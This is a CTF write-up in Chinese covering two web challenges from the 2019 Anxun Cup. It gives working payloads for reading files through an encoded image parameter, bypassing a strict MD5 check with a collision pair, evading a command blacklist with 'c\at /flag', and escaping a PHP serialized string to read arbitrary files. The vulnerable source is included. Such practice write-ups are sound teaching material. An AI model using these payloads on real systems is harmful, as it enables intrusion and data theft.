# 安洵杯 2019

## Web

### easy\_web

进入页面后可以获得 Hint `md5 is funny ~` ，并且从 URL 可以发现 payload 如下

```url
?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```

在开发者工具 - Elements 中将 `background` 注释掉方便查看回显。

尝试传入以下 Payload

```url
img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=ls
img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=echo
```

回显 `forbid ~` ，说明均被过滤了，尝试将 `img` 的值删除回显时图片消失，说明图片时通过 `img` 引入的。

将 `TXpVek5UTTFNbVUzTURabE5qYz0` 丢进 CyberChef 一把梭可以得到经过两次 base64 解码以及一次 16 进制转字符串的值 `555.png`

!\[easy\_web-1]\(E:\ICloud\iCloudDrive\Note\CTF\安洵杯 2019\easy\_web-1.png)

那就反其道而行之，将 `index.php` 的值以上面的逆序进行转换得到值 `TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`

!\[easy\_web-2]\(E:\ICloud\iCloudDrive\Note\CTF\安洵杯 2019\easy\_web-2.png)

将得到的值进行传入，Payload 如下

```url
img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&cmd=
```

回显后进行 base64 解码可以得到 `index.php` 的源码

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
```

想要执行系统命令就需要进行 md5 强比较绕过，这里进行了 string 强制类型转换，所以只能通过碰撞找出 md5 值相同的两个字符串了，可以通过 fastroll 进行生成，也可以在网上找生成好的，构造 Payload(body) 如下

```url
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

回显时 `md5 is funny ~` 消失了，说明绕过成功了，之后就是绕过黑名单，虽然空格没有过滤，但是还是没找到突破口，通过百度才发现 PHP 正则替换存在一个特别的情况。当我们想过滤 `\` 的时候，我们会想到用 `\\` 来解决，但是实际上并没有实现过滤，因为 PHP 会先进行一次解析，这时候我们要过滤的实际变成空白，所以要想过滤 `\` 需要使用 `\\\\` 来解决，这时候 PHP 进行解析后变成 `\\` ，这就匹配成功了。

因此上述正则中的 `|\\|\\\\|` 其实是 `|\|\\|` ，也就是过滤了 `|\` ，并没有过滤 `\` 。故可以通过构造如下 Payload 进行绕过

```url
img=&cmd=c\at /flag
```

这时候这道题就结束了。

### easy\_serialize\_php

```php
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST); // 构造变量

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

当 `$function == 'show_image'` 时，会输出 `$userinfo['img']` 的内容，因此下一步就是修改 `$userinfo['img']` 的值。

在源码上方存在 `extract($_POST);` 因此可以通过该函数进行传值，但是传入的值会被后面的 `$_SESSION['img']` 顶掉，所以这题需要通过 `filter()` 函数进行反序列化字符串逃逸。

先根据提示在 `phpinfo()` 中找到了 `d0g3_f1ag.php` ，猜测 flag 就在这里。

通过输出 `$serialize_info` 的序列化可以得到回显如下

```
s:84:"a:3:{s:4:"user";s:5:"guest";s:8:"function";N;s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}";
```

通过传入 Payload 如下

```
_SESSION[flagflag]=";i:1;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

即可使得序列化字符串变为

```
s:104:"a:2:{s:8:"";s:45:"";i:1;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}";
```

此时再进行反序列化则会得到

```
array(2) { ["";s:45:""]=> int(1) ["img"]=> string(20) "ZDBnM19mMWFnLnBocA==" }
```

验证逃逸成功，再设置 `param:f=show_image` 即可得到 `d0g3_f1ag.php` 源代码如下

```php
<?php
$flag = 'flag in /d0g3_fllllllag';
?>
```

那就将 `/d0g3_fllllllag` base64 编码得到 `ZDBnM19mbGxsbGxsYWc=` ，这时的 Payload 如下

```
_SESSION[flagflag]=";i:1;s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

就可以得到 flag 力。
